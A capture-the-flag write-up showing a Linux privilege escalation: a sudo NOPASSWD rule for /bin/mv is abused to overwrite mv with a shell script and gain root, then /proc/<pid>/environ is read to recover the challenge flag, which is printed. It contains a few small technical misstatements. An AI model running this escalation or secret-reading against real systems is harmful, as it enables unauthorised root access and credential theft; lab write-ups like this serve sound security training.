Event: NCA CTF  
Category: #Pentest 

---

## ğŸ“Œ Challenge Information

- Points: Not provided
    
- Solves: Not provided
    
- Difficulty: Easyâ€“Medium
    
- Credentials (if provided):
    
    - Username: `ctfplayer`
        
    - Password: `ctfplayer`
        

---

## ğŸ“ Challenge Description

SSH into the provided instance and retrieve the flag.

---

# ğŸ” Initial Enumeration

### Step 1 â€“ Basic Check

```bash
ls -la
```

Result:

- Only `.ash_history` present
    
- No flag file visible
    

---

### Step 2 â€“ Check Hidden Files

```bash
ls -a
```

Nothing interesting besides `.ash_history`.

---

### Step 3 â€“ Additional Enumeration

```bash
pwd
whoami
env
```

- Current user: `ctfplayer`
    
- No flag in environment variables
    

---

## ğŸ‘€ Observations

Running:

```bash
sudo -l
```

Output:

```
User ctfplayer may run the following commands:
    (ALL) NOPASSWD: /bin/mv
```

ğŸ”´ **Key Finding:**  
User can run `/bin/mv` as root **without password**.

This is dangerous because `/bin/mv` is writable and can be replaced.

---

# ğŸš§ Problem Identified

### Main Trick Used:

âœ… **Permission issue + PATH manipulation**

Specifically:

- `sudo` allowed execution of `/bin/mv` as root
    
- We replaced `/bin/mv` with our own malicious script
    
- That script spawns `/bin/sh`
    
- Running it via sudo gives root shell
    

This is a classic **GTFOBins-style privilege escalation**.

---

# ğŸ›  Exploitation / Solution

## Method Used â€“ Binary Overwrite

### Step 1 â€“ Create Malicious Script

```bash
echo '#!/bin/sh' > mymv
echo '/bin/sh' >> mymv
chmod +x mymv
```

This script simply launches a shell.

---

### Step 2 â€“ Replace `/bin/mv`

```bash
sudo mv mymv /bin/mv
```

Because `mv` is allowed as NOPASSWD root, we successfully overwrite `/bin/mv`.

---

### Step 3 â€“ Execute It as Root

```bash
sudo /bin/mv
```

We now get:

```bash
whoami
root
```

ğŸ”¥ Root shell achieved.

---

## Finding the Flag

Searching manually didnâ€™t reveal the flag file.

Then we inspected running processes:

```bash
ps aux
```

We noticed:

```
/opt/entrypoint.sh
```

Letâ€™s inspect it:

```bash
cat /opt/entrypoint.sh
```

Inside the script:

```bash
echo "$GZCTF_FLAG" > /home/ctfplayer/flag.txt
```

ğŸ’¡ That means the flag is stored in an environment variable.

---

### Step 4 â€“ Dump Environment of the Running Process

Find PID of entrypoint:

```
7 root  /bin/sh /opt/entrypoint.sh
```

Then:

```bash
cat /proc/7/environ | tr '\0' '\n'
```

Output:

```
GZCTF_FLAG=NCA{YOu_ARe_4_moVlng_FoRwaRD_lN_NC4_69a57240e19f}
```

---

# ğŸ“¤ Command Used to Retrieve the Flag

```bash
cat /proc/7/environ | tr '\0' '\n'
```

Output:

```
GZCTF_FLAG=NCA{YOu_ARe_4_moVlng_FoRwaRD_lN_NC4_69a57240e19f}
```

---

# ğŸš© Final Flag

```
NCA{YOu_ARe_4_moVlng_FoRwaRD_lN_NC4_69a57240e19f}
```

---

# ğŸ§  Key Takeaways

- Always run `sudo -l`
    
- NOPASSWD binaries are gold
    
- Overwriting allowed binaries = instant root
    
- Environment variables can store flags
    
- `/proc/<pid>/environ` is extremely useful
    
- Read entrypoint scripts in containers
    

---

# ğŸ“š Skills Practiced

- Linux Enumeration
    
- Privilege Escalation
    
- Environment Variable Exploitation
    
- GTFOBins Concepts
    
- Process Inspection (`/proc`)
    
- Container Analysis
    

---

# ğŸ Personal Reflection

Next time I would:

- Immediately run `sudo -l`
    
- Check writable privileged binaries faster
    
- Inspect `/opt` and entrypoint scripts earlier
    
- Check `/proc/*/environ` sooner
    

This was a clean and clever privilege escalation + environment variable trick. ğŸš€